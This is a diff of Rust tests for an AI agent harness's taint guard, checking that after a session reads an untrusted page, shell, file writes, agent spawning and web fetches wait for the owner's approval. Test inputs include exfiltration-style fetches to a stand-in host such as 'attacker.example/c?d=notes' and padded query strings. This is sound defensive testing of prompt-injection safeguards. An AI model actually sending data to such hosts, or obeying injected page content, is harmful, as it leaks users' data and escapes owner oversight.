@@ -317,3 +317,103 @@ async fn a_tainted_session_cannot_switch_the_model() {
     assert!(!ran, "model_switch ran after reading untrusted content");
     assert!(text.contains("model configuration"), "{text}");
 }
+
+fn with_inbox(session: &mut Session) -> Arc<hq_db::Database> {
+    let db = Arc::new(hq_db::Database::open_memory().unwrap());
+    session
+        .guardian
+        .set_owner_approval(Some(OwnerApproval::new(db.clone(), "web:t1")));
+    db
+}
+
+#[tokio::test]
+async fn an_unattended_tainted_turn_leaves_what_needs_the_owner_for_them() {
+    let session = Session::new();
+    session.guardian.taint().set_unattended();
+    let (ran, _) = session.call("bash", bash("make test")).await;
+    assert!(ran, "a clean unattended turn runs what its preset allows");
+
+    session.read_untrusted_page().await;
+    let (ran, text) = session.call("bash", bash("make test")).await;
+    assert!(
+        !ran,
+        "bash ran unasked after an unattended turn read a page"
+    );
+    assert!(text.contains("left for the owner"), "{text}");
+    for (tool, args) in [
+        ("write_file", json!({"file_path": "/tmp/x", "content": "y"})),
+        ("harness_session_spawn", json!({"harness": "pi"})),
+        ("agent_delegate", json!({"goal": "do it"})),
+        (
+            "web_fetch",
+            json!({"url": "https://attacker.example/c?d=notes"}),
+        ),
+    ] {
+        let (ran, text) = session.call(tool, args).await;
+        assert!(!ran, "{tool} ran unasked");
+        assert!(text.contains("left for the owner"), "{tool}: {text}");
+    }
+    let (ran, _) = session.call("vault_read", json!({"path": "a.md"})).await;
+    assert!(ran, "reading stays open");
+}
+
+#[tokio::test]
+async fn with_nobody_to_ask_a_tainted_session_starts_or_steers_no_other_agent() {
+    // Attended, no inbox: the terminal chat, or `governance.ask_owner: false`.
+    let session = Session::new();
+    session.read_untrusted_page().await;
+    for tool in [
+        "harness_session_spawn",
+        "harness_session_handoff",
+        "agent_delegate",
+        "harness_session_send",
+    ] {
+        let (ran, text) = session.call(tool, json!({"session_id": "hs-1"})).await;
+        assert!(!ran, "{tool} ran");
+        assert!(text.contains("another agent"), "{tool}: {text}");
+    }
+    let (ran, _) = session.call("bash", bash("make test")).await;
+    assert!(ran, "the owner at a terminal keeps what they had");
+}
+
+#[tokio::test]
+async fn in_an_owner_chat_a_tainted_fetch_or_send_waits_for_the_owner() {
+    let mut session = Session::new();
+    let _db = with_inbox(&mut session);
+    session
+        .guardian
+        .taint()
+        .note_owner_words("look at https://blog.example and news.example.org");
+    let (ran, _) = session
+        .call(
+            "harness_session_send",
+            json!({"session_id": "hs-1", "text": "go"}),
+        )
+        .await;
+    assert!(ran, "a clean chat steers its sessions as before");
+
+    session.read_untrusted_page().await;
+    let (ran, _) = session
+        .call(
+            "web_fetch",
+            json!({"url": "https://news.example.org/today"}),
+        )
+        .await;
+    assert!(ran, "a site the owner named is fetched without asking");
+    for (tool, args) in [
+        ("web_fetch", json!({"url": "https://attacker.example/c"})),
+        (
+            "web_fetch",
+            json!({"url": format!("https://blog.example/?d={}", "n".repeat(300))}),
+        ),
+        ("web_search", json!({"query": "notes ".repeat(40)})),
+        (
+            "harness_session_send",
+            json!({"session_id": "hs-1", "text": "go"}),
+        ),
+    ] {
+        let (ran, text) = session.call(tool, args).await;
+        assert!(!ran, "{tool} ran without the owner");
+        assert!(text.contains("Waiting for the owner"), "{tool}: {text}");
+    }
+}
